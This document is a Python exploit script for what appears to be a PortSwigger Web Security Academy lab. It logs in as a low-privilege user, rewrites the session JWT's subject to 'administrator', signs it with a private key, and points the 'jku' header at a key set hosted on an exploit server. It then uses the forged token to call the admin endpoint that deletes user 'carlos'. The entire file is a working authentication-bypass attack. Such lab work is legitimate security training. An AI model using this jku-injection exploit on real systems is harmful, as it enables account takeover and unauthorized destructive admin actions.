import jwt
import base64
import json
import requests as rq
from bs4 import BeautifulSoup
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend


def delete_carlos(modified_token):
    cookies = {"session": modified_token}
    delete_url = f"{BASE}/admin/delete?username=carlos"

    r = rq.get(delete_url, cookies=cookies)

    if r.status_code == 200:
        print("[+] Done!")
    else:
        print(f"[-] Failed: {r.status_code}")

BASE = "https://0a5500a103822aa28006c17200770010.web-security-academy.net/"
LOGIN = f"{BASE}/login"


jku_url = "https://exploit-0a5a0022030d2ae480d8c03401ca00d3.exploit-server.net/jwks.json"

s = rq.Session()

r = s.get(LOGIN)
soup = BeautifulSoup(r.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

resp = s.post(LOGIN, data={
    "csrf": csrf,
    "username": "wiener",
    "password": "peter"
})

print("[+] Status:", resp.status_code)

jwt_token = s.cookies.get("session")

with open('public_key.pem', 'rb') as f:
    public_key = serialization.load_pem_public_key(
        f.read(),
        backend=default_backend()
    )

decoded_token = jwt.decode(jwt_token, options={"verify_signature": False})
print(f"[+] Decoded token: {decoded_token}\n")

decoded_header = jwt.get_unverified_header(jwt_token)
algorithm = decoded_header["alg"]

print(f"[+] Decoded header: {decoded_header}\n")

decoded_token['sub'] = 'administrator'
print(f"[+] Modified token: {decoded_token}\n")


with open('private_key.pem', 'rb') as f:
    private_key = serialization.load_pem_private_key(
        f.read(),
        password=None,
        backend=default_backend()
    )

public_key = private_key.public_key()
public_number = public_key.public_numbers()

def b64url_uint(val: int) -> str:
    return base64.urlsafe_b64encode(
        val.to_bytes((val.bit_length() + 7) // 8, "big")
    ).rstrip(b"=").decode("utf-8")

jwk = {
    "kty": "RSA",
    "e": b64url_uint(public_number.e),
    "n": b64url_uint(public_number.n),
    "kid": decoded_header['kid'] 
}
keys = {"keys": [jwk]}
print(f"JWK:\n{json.dumps(keys, indent=4)}\n")

# Go to exploit server, paste here in body, change the header is 
# HTTP/1.1 200 OK
# Content-Type: application/json; charset=utf-8

modified_token = jwt.encode(decoded_token, private_key, algorithm=algorithm, headers={'jku': jku_url, 'kid': jwk['kid']})

print(f"[+] Modified header:\n{json.dumps(jwt.get_unverified_header(modified_token), indent=4)}\n")

print("[+] Final Token: " + modified_token)

delete_carlos(modified_token)